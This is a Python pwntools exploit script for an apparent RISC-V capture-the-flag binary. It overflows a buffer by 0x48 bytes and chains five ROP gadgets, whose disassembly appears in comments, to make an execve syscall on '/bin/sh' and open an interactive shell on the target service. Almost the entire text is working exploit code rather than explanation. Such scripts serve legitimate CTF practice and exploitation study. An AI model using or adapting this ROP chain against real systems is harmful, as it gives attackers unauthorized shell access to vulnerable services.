from pwn import *

context.arch = 'riscv'
exe = ELF('./chal')

#io = process(['qemu-riscv64', '-L', '/opt/riscv/sysroot', '-g', '1234','./chal'])

#io = process(['qemu-riscv64', '-L', '/opt/riscv/sysroot','./chal'])

io = remote('0.0.0.0', 10007)

'''
   ld	ra,344(sp)
   ld	s0,336(sp)
   ld	s1,328(sp)
   ld	s2,320(sp)
   ld	s3,312(sp)
   ld	s5,296(sp)
   ld	s6,288(sp)
   ld	s7,280(sp)
   ld	s8,272(sp)
   ld	s9,264(sp)
   ld	s10,256(sp)
   ld	s11,248(sp)
   mv	a0,s4
   ld	s4,304(sp)
   addi	sp,sp,352
   ret
'''
g1 = 0x40b12

'''
    0x27b64 <__gconv_transform_utf8_internal+418>:	mv	a7,s5
    0x27b66 <__gconv_transform_utf8_internal+420>:	li	a6,0
    0x27b68 <__gconv_transform_utf8_internal+422>:	li	a4,0
    0x27b6a <__gconv_transform_utf8_internal+424>:	mv	a3,s7
    0x27b6c <__gconv_transform_utf8_internal+426>:	addi	a2,sp,56
    0x27b6e <__gconv_transform_utf8_internal+428>:	jalr	s4
'''
g2 = 0x27b9c

'''
  0x00014046               5a86  mv a2, s6
  0x00014048               a685  mv a1, s1
  0x0001404a               6a85  mv a0, s10
  0x0001404c               829b  jalr s7
'''
g3 = 0x1407a

'''
   0x18498 <flush_cleanup+84>:	ecall
   0x1849c <flush_cleanup+88>:	ret
'''
g4 = 0x184d2

'''
0x0004bc90               0a85  mv a0, sp
0x0004bc92               0299  jalr s2
'''
g5 = 0x4bdf8

off = 0x48

payload = p8(0x42)*(off)
payload += p64(g1)
payload += p64(0)*31
payload += p64(0x41) #s11
payload += p64(0x0) #s10
payload += p64(0x43) #s9
payload += p64(0x44) #s8
payload += p64(g5) #s7
payload += p64(0x0) #s6
payload += p64(0xdd) #s5
payload += p64(g3) #s4
payload += p64(0x49) #s3
payload += p64(g4) #s2
payload += p64(0x0) #s1
payload += p64(0x4c) #s0
payload += p64(g2) #ra
payload += b"/bin/sh\x00"

io.sendlineafter("input: ", payload)

io.interactive()

